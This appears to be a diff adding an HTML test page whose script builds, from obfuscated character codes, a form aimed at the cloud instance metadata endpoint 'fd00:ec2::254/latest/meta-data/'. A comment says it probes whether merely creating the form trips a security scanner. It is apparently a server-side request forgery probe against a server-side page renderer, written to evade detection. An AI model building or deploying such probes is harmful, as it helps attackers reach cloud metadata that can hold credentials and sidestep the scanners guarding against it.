@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html><body>
+<h1>FORM_SUBMIT_TEST</h1>
+<div id="r1">LOADING</div>
+<script>
+var ip = String.fromCharCode(102,100,48,48,58,101,99,50,58,58,50,53,52);
+var proto = String.fromCharCode(104,116,116,112);
+var url = proto + '://[' + ip + ']/latest/meta-data/';
+
+var form = document.createElement('form');
+form.method = 'GET';
+form.action = url;
+form.target = '_self';
+
+try {
+  document.body.appendChild(form);
+  document.getElementById('r1').innerText = 'FORM_CREATED:' + url;
+  // Don't submit yet - test if just creating the form triggers scanner
+} catch(e) {
+  document.getElementById('r1').innerText = 'FORM_ERROR:' + e.name + ':' + e.message;
+}
+</script>
+</body></html>
